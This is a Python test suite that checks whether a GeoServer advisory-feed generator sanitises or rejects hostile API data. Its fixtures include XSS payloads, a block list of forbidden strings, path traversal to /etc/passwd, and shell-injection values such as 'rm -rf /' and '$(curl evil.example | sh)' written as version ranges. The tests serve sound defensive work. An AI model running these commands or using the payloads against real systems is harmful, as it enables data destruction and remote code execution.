"""Hostile-input tests: crafted API data must produce a clean feed that passes the
independent validator, or fail the run. It must never be skipped silently."""

import json
import sys
import unittest
from datetime import datetime, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))

import check_versions as cv  # noqa: E402
import validate_feed  # noqa: E402
from test_check_versions import UTC, no_blog, raw_advisory, raw_release, real_releases, releases_from  # noqa: E402

NOW = datetime(2026, 10, 8, 6, 0, 0, tzinfo=UTC)

FORBIDDEN_TEXT = ("javascript:", "vbscript:", "data:", "onerror", "<script")
FORBIDDEN_CHARS = "  ‪‫‬‭‮​‌‍‎‏⁦⁧⁨⁩﻿\x00"


def ghsa(n):
    letters = "abcdefghijklmnopqrstuvwxyz0123456789"
    return "GHSA-" + "-".join(
        "".join(letters[(n // 36 ** k + i) % 36] for k in range(4)) for i in range(3)
    )


def generate(raw_advisories, releases=None):
    log = []
    feed = cv.build_feed(releases or real_releases(), raw_advisories, no_blog, None, NOW, log.append)
    text = cv.serialize(feed)
    return feed, text, log


class HostileCase(unittest.TestCase):
    def assert_clean(self, feed, text):
        self.assertEqual([], validate_feed.validate_text(text.encode("utf-8")))
        for char in "<>&" + FORBIDDEN_CHARS:
            self.assertNotIn(char, text, repr(char))
        self.assertFalse(text.startswith("﻿"))
        document = json.loads(text)
        strings = [value for _, value in validate_feed.each_string(document)]
        for value in strings:
            lowered = value.lower()
            for bad in FORBIDDEN_TEXT:
                self.assertNotIn(bad, lowered, bad)
            self.assertFalse(any(ord(ch) < 32 for ch in value))
            self.assertFalse(any(0x7F <= ord(ch) <= 0x9F for ch in value))
        for advisory in document["advisories"]:
            for char in "<>":
                self.assertNotIn(char, advisory["summary"])


class SummaryTest(HostileCase):
    SUMMARIES = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "JaVaScRiPt:alert(1) and vbscript:msgbox(1) and data:text/html,x",
        "[click me](javascript:alert(1)) and ![pic](data:image/png;base64,AAAA)",
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "&#106;avascript:alert(1)",
        "&#x6a;avascript&colon;alert(1) &amp;lt;script&amp;gt;",
        "java\tscript:alert(1) java\nscript:alert(1)",
        "jajavascript:vascript:alert(1)",
        "<<script>>alert(1)<</script>>",
        "<svg/onload=alert(1)>",
        '<a href="javascript:alert(1)">x</a> <b>bold</b>',
        "unterminated <script src=//evil",
        "**bold** `code` ~~gone~~ # heading > quote",
        "‮gnirts‬ ⁦x⁩ ​zero‍width",
    ]

    def test_every_summary_is_cleaned_and_the_advisory_is_kept(self):
        raws = [raw_advisory(ghsa(i), summary=s) for i, s in enumerate(self.SUMMARIES)]
        feed, text, _ = generate(raws)
        self.assert_clean(feed, text)
        self.assertEqual({r["ghsa_id"] for r in raws}, {a["ghsa_id"] for a in feed["advisories"]})

    def test_cleaning_is_idempotent_for_text_without_entities(self):
        for summary in self.SUMMARIES:
            if "&" in summary:
                continue  # entities are decoded once, by design
            once = cv.clean_text(summary, 500)
            self.assertEqual(once, cv.clean_text(once, 500), summary)

    def test_markup_is_removed_but_text_is_kept(self):
        self.assertEqual("alert(1)", cv.clean_text("<script>alert(1)</script>"))
        self.assertEqual("click me", cv.clean_text("[click me](javascript:alert(1))"))
        self.assertEqual("Improper ENTITY_RESOLUTION_ALLOWLIST URI validation in XML Processing (SSRF)",
                         cv.clean_text("Improper ENTITY_RESOLUTION_ALLOWLIST URI validation in XML Processing (SSRF)"))
        self.assertEqual("Tom & Jerry", cv.clean_text("Tom &amp; Jerry"))

    def test_entities_are_decoded_only_once(self):
        self.assertEqual("&lt;b&gt;", cv.clean_text("&amp;lt;b&amp;gt;"))

    def test_control_and_invisible_characters(self):
        raw = "a\rb\nc\x00d\te f‮g​h﻿i\x7f\x85j"
        self.assertEqual("a b cd e fghi j", cv.clean_text(raw))

    def test_unicode_is_normalised_and_collapsed(self):
        self.assertEqual("é x", cv.clean_text("é      x"))

    def test_a_huge_summary_is_truncated(self):
        feed, text, _ = generate([raw_advisory(summary="word " * 20000)])
        self.assertLessEqual(len(feed["advisories"][0]["summary"]), cv.MAX_SUMMARY)
        self.assert_clean(feed, text)

    def test_truncation_never_splits_a_pair(self):
        summary = "x" * 499 + "\U0001F600" * 5
        cleaned = cv.clean_text(summary, 500)
        self.assertLessEqual(len(cleaned), 500)
        cleaned.encode("utf-8")  # raises on a lone surrogate

    def test_lone_surrogates_are_removed(self):
        self.assertEqual("ab", cv.clean_text("a\ud800b"))

    def test_wrong_type_fails_the_run(self):
        for value in (5, None, {"a": 1}, ["x"], True):
            with self.assertRaises(cv.FeedError, msg=repr(value)):
                cv.transform_advisory(raw_advisory(summary=value))


class IdentifierTest(HostileCase):
    def test_bad_ghsa_ids_fail_the_run_and_name_the_advisory(self):
        for bad in (
            "GHSA-xxxx-xxxx-xxxx/../../x",
            'GHSA-"a"-bbbb-cccc',
            "GHSA-ab d-efgh-ijkl",
            "GHSA-ABCD-EFGH-IJKL",
            "GHSA-abcd-efgh-ijkl\n",
            "",
            5,
            None,
        ):
            with self.assertRaises(cv.FeedError, msg=repr(bad)) as caught:
                generate([raw_advisory(ghsa=bad)])
            message = str(caught.exception)
            self.assertIn("advisory #0", message)
            self.assertNotIn("\n", message)
            self.assertTrue(message.isascii())

    def test_bad_cve_ids_are_omitted_and_the_advisory_is_kept(self):
        for bad in ("<b>CVE-2026-0001</b>", "CVE-26-1", "cve-2026-00000", 5, ["CVE-2026-00000"], "CVE-2026-00000 "):
            advisory = cv.transform_advisory(raw_advisory(cve_id=bad))
            self.assertNotIn("cve_id", advisory, repr(bad))
            feed, text, _ = generate([raw_advisory(cve_id=bad)])
            self.assert_clean(feed, text)
            self.assertEqual(1, len(feed["advisories"]))

    def test_missing_cve_id_stays_null(self):
        self.assertIsNone(cv.transform_advisory(raw_advisory(cve_id=None))["cve_id"])

    def test_unknown_severity_fails_the_run(self):
        for bad in ("urgent", "CRITICAL", "Critical", "", None, 3, "critical "):
            with self.assertRaises(cv.FeedError, msg=repr(bad)):
                cv.transform_advisory(raw_advisory(severity=bad))

    def test_bad_timestamps_fail_the_run(self):
        for bad in ("2026-01-01", "2026-01-01T00:00:00+00:00", "2026-13-45T00:00:00Z", None, 20260101, "2026-1-1T0:0:0Z"):
            with self.assertRaises(cv.FeedError, msg=repr(bad)):
                cv.transform_advisory(raw_advisory(published_at=bad))


class RangeTest(HostileCase):
    def test_hostile_ranges_are_blanked_for_manual_review(self):
        sha = "df11a650c650ff895977c5440427c239671ee649"
        raw = raw_advisory(
            vulnerabilities=[
                {"vulnerable_version_range": "; rm -rf /"},
                {"vulnerable_version_range": "$(curl evil.example | sh)"},
                {"vulnerable_version_range": sha},
                {"vulnerable_version_range": ""},
                {"vulnerable_version_range": "x" * 500},
                {"vulnerable_version_range": "<script>"},
                {"vulnerable_version_range": "../../etc/passwd"},
                {"vulnerable_version_range": ">= 2.28.0, < 2.28.5"},
            ]
        )
        feed, text, _ = generate([raw])
        self.assert_clean(feed, text)
        self.assertEqual(["", sha, ">= 2.28.0, < 2.28.5"], feed["advisories"][0]["vulnerable_versions"])

    def test_the_plain_github_wording_is_kept_unchanged(self):
        for good in ("< 2.23.5", ">=2.24.0, <2.24.4", "3.0.0", "<= 2.26.3", ">2.23.5, <2.25.0, >=2.25.3",
                     "~2.1", "^3.0.0", "= 3.0.0", "2.0.0-beta1", "df11a650c650ff895977c5440427c239671ee649"):
            self.assertEqual(good, cv.clean_range(good))
        for bad in ("<script>", "alert(1)", "rm -rf", "~2.1 ^3.0", "1.0 || 2.0", ">=", "<>", "x.y.z"):
            self.assertEqual("", cv.clean_range(bad), bad)

    def test_a_thousand_distinct_ranges_fail_the_run(self):
        raw = raw_advisory(vulnerabilities=[{"vulnerable_version_range": f"< 1.0.{i}"} for i in range(1000)])
        with self.assertRaises(cv.FeedError):
            generate([raw])

    def test_a_thousand_identical_ranges_collapse(self):
        raw = raw_advisory(vulnerabilities=[{"vulnerable_version_range": "< 2.28.5"}] * 1000)
        feed, text, _ = generate([raw])
        self.assertEqual(["< 2.28.5"], feed["advisories"][0]["vulnerable_versions"])
        self.assertIn("\\u003c 2.28.5", text)

    def test_fifty_ranges_are_allowed_and_fifty_one_are_not(self):
        fifty = raw_advisory(vulnerabilities=[{"vulnerable_version_range": f"< 1.0.{i}"} for i in range(50)])
        self.assertEqual(50, len(cv.transform_advisory(fifty)["vulnerable_versions"]))
        with self.assertRaises(cv.FeedError):
            cv.transform_advisory(raw_advisory(vulnerabilities=[{"vulnerable_version_range": f"< 1.0.{i}"} for i in range(51)]))

    def test_wrong_types_fail_the_run(self):
        for vulnerabilities in ({"a": 1}, "text", 5, [5], ["x"], [None], [{"vulnerable_version_range": 5}],
                                [{"vulnerable_version_range": ["<1"]}], [{"patched_versions": 5}],
                                [{"patched_versions": {"a": 1}}]):
            with self.assertRaises(cv.FeedError, msg=repr(vulnerabilities)):
                cv.transform_advisory(raw_advisory(vulnerabilities=vulnerabilities))

    def test_a_non_object_advisory_fails_the_run(self):
        for raw in ("text", 5, None, ["x"]):
            with self.assertRaises(cv.FeedError):
                cv.transform_advisories([raw])
        with self.assertRaises(cv.FeedError):
            cv.transform_advisories({"a": 1})

    def test_a_hostile_patched_version_is_ignored_not_published(self):
        raw = raw_advisory(vulnerabilities=[{"vulnerable_version_range": "< 3.0.1", "patched_versions": "<script>3.0.1</script>; 2.7.1.1, 99"}])
        feed, text, _ = generate([raw])
        self.assert_clean(feed, text)
        self.assertEqual({"3.0.x": "3.0.1"}, feed["advisories"][0]["patched_versions"])


class SizeAndCountTest(HostileCase):
    def test_ten_thousand_advisories_fail_the_run(self):
        raws = [raw_advisory(ghsa(i)) for i in range(10000)]
        with self.assertRaises(cv.FeedError):
            generate(raws)

    def test_exactly_500_advisories_are_allowed(self):
        raws = [raw_advisory(ghsa(i)) for i in range(500)]
        feed, text, _ = generate(raws)
        self.assertEqual(500, len(feed["advisories"]))
        self.assert_clean(feed, text)

    def test_duplicate_advisory_ids_fail_the_run(self):
        with self.assertRaises(cv.FeedError):
            generate([raw_advisory(), raw_advisory()])

    def test_a_file_over_one_mebibyte_fails_the_run(self):
        raws = [
            raw_advisory(
                ghsa(i),
                summary="word " * 200,
                vulnerabilities=[{"vulnerable_version_range": "< " + "1." * 50 + str(j)} for j in range(50)],
            )
            for i in range(500)
        ]
        with self.assertRaises(cv.FeedError):
            generate(raws)

    def test_more_than_100_series_fail_the_run(self):
        releases = releases_from([raw_release(f"{i}.0.0", "2026-01-01T00:00:00Z") for i in range(1, 102)])
        with self.assertRaises(cv.FeedError):
            cv.build_feed(releases, [], no_blog, None, NOW)


class ParseJsonTest(unittest.TestCase):
    def test_duplicate_keys_are_rejected(self):
        with self.assertRaises(cv.FeedError):
            cv.parse_api_json('{"a": 1, "a": 2}')
        with self.assertRaises(cv.FeedError):
            cv.parse_api_json('[{"x": {"k": 1, "k": 1}}]')

    def test_non_finite_numbers_are_rejected(self):
        for text in ('{"a": NaN}', '{"a": Infinity}', '{"a": -Infinity}', '{"a": 1e999}', "[NaN]"):
            with self.assertRaises(cv.FeedError, msg=text):
                cv.parse_api_json(text)

    def test_deep_nesting_is_rejected(self):
        for depth in (30, 100000):
            with self.assertRaises(cv.FeedError, msg=depth):
                cv.parse_api_json("[" * depth + "]" * depth)
        with self.assertRaises(cv.FeedError):
            cv.parse_api_json('{"a":' * 40 + "1" + "}" * 40)

    def test_invalid_json_and_oversized_responses_are_rejected(self):
        for text in ("", "{", "[1,]", "nope"):
            with self.assertRaises(cv.FeedError, msg=text):
                cv.parse_api_json(text)
        with self.assertRaises(cv.FeedError):
            cv.parse_api_json("[" + "1," * (cv.MAX_API_BYTES // 2) + "1]")

    def test_ordinary_data_parses(self):
        self.assertEqual({"a": [1, 2.5, "x", None, True]}, cv.parse_api_json('{"a": [1, 2.5, "x", null, true]}'))


class ReleaseTest(HostileCase):
    def test_hostile_tags_are_ignored_and_never_published(self):
        hostile = ["../../evil", "v1;rm", "3.0.1\n", "٣.٠.١", "3.0.1 ", "3.0.1/../x", "<b>3.0.1</b>", "3.0.1-rc", ""]
        releases = releases_from([raw_release(tag, "2026-10-01T00:00:00Z") for tag in hostile])
        self.assertEqual([], releases)
        feed, text, _ = generate([], real_releases() + releases)
        self.assert_clean(feed, text)
        self.assertNotIn("evil", text)

    def test_release_url_is_built_from_the_tag(self):
        release = cv.parse_release(raw_release("v3.0.1", "2026-08-14T22:44:22Z"))
        self.assertEqual("https://github.com/geoserver/geoserver/releases/tag/v3.0.1", release.url)
        raw = raw_release("3.0.1", "2026-08-14T22:44:22Z")
        raw["html_url"] = "https://evil.example/\"><script>"
        self.assertEqual("https://github.com/geoserver/geoserver/releases/tag/3.0.1", cv.parse_release(raw).url)

    def test_wrong_types_fail_the_run(self):
        for raw in (
            "text",
            {"tag_name": 5, "published_at": "2026-01-01T00:00:00Z"},
            {"tag_name": "3.0.1", "published_at": 5},
            {"tag_name": "3.0.1", "published_at": "2026-01-01T00:00:00Z", "draft": "yes"},
            {"tag_name": "3.0.1", "published_at": "yesterday"},
            None,
        ):
            with self.assertRaises(cv.FeedError, msg=repr(raw)):
                cv.parse_release(raw)


class UrlAndBlogTest(unittest.TestCase):
    def test_checked_url(self):
        self.assertEqual("https://geoserver.org/a/b.html", cv.checked_url("https://geoserver.org/a/b.html"))
        for bad in (
            "http://geoserver.org/x",
            "https://evil.example/x",
            "https://geoserver.org@evil.example/x",
            "https://user:pw@geoserver.org/x",
            "https://geoserver.org/a b",
            "https://geoserver.org/a\nb",
            "https://geoserver.org.evil.example/x",
            "https://geoserver.org:8443/x",
            "https://geoserver.org/" + "a" * 500,
            "javascript:alert(1)",
            "//geoserver.org/x",
            "https://",
            5,
            None,
        ):
            self.assertIsNone(cv.checked_url(bad), repr(bad))

    def test_blog_url_is_built_from_validated_parts(self):
        url = cv.build_blog_url("2026-08-14-geoserver-3-0-1-released.md", ["announcements", "vulnerability"])
        self.assertEqual("https://geoserver.org/announcements/vulnerability/2026/08/14/geoserver-3-0-1-released.html", url)
        hostile = cv.build_blog_url("2026-08-14-geoserver-3-0-1-released.md", ["../../x", "a b", '"><script>', "evil.example"])
        self.assertEqual("https://geoserver.org/announcements/2026/08/14/geoserver-3-0-1-released.html", hostile)
        for name in ("2026-08-14-../../evil.md", "2026-08-14-a b.md", "x.md", "2026-08-14-UPPER.md", "2026-08-14-a/b.md"):
            self.assertIsNone(cv.build_blog_url(name, []), name)

    def test_reused_blog_data_is_revalidated(self):
        previous = [
            {
                "series": "3.0.x",
                "latest_version": "3.0.1",
                "blog_confirmed": True,
                "blog_url": "https://evil.example/x",
                "security_flagged": True,
                "cve_ids": ["CVE-2026-00000"],
            },
            {
                "series": "2.28.x",
                "latest_version": "2.28.5",
                "blog_confirmed": True,
                "blog_url": None,
                "security_flagged": "yes",
                "cve_ids": ["<b>"],
            },
        ]
        looked_up = []

        def lookup(release):
            looked_up.append(release.version)
            return None

        entries = {e["series"]: e for e in cv.build_series_entries(real_releases(), lookup, previous)}
        self.assertIn("3.0.1", looked_up)
        self.assertIn("2.28.5", looked_up)
        self.assertIsNone(entries["3.0.x"]["blog_url"])

    def test_previous_feed_with_the_wrong_shape_is_ignored(self):
        for previous in ("text", [], {"series": "x"}, {"series": [5, None, "x"]}):
            cv.build_feed(real_releases(), [], no_blog, previous, NOW)


class SerialisationTest(unittest.TestCase):
    def test_escapes_html_characters_and_round_trips(self):
        feed, text, _ = generate([raw_advisory(vulnerabilities=[{"vulnerable_version_range": ">= 1.0.0, < 2.0.0"}])])
        for char in "<>&":
            self.assertNotIn(char, text)
        self.assertEqual(">= 1.0.0, < 2.0.0", json.loads(text)["advisories"][0]["vulnerable_versions"][0])
        self.assertEqual(feed, json.loads(text))

    def test_utf8_without_bom_and_one_document(self):
        _, text, _ = generate([])
        raw = text.encode("utf-8")
        self.assertFalse(raw.startswith(b"\xef\xbb\xbf"))
        self.assertTrue(raw.endswith(b"}\n"))
        decoder = json.JSONDecoder()
        _, end = decoder.raw_decode(text)
        self.assertEqual("", text[end:].strip())

    def test_key_order_is_stable(self):
        feed, _, _ = generate([raw_advisory()])
        self.assertEqual(["source_note", "schema_version", "generated", "series", "advisories"], list(feed))
        self.assertEqual(
            ["series", "phase", "latest_version", "published_at", "release_url", "blog_confirmed", "blog_url",
             "security_flagged", "synchronized_release", "cve_ids"],
            list(feed["series"][0]),
        )

    def test_non_finite_numbers_cannot_be_serialised(self):
        with self.assertRaises(ValueError):
            cv.serialize({"x": float("nan")})


if __name__ == "__main__":
    unittest.main()
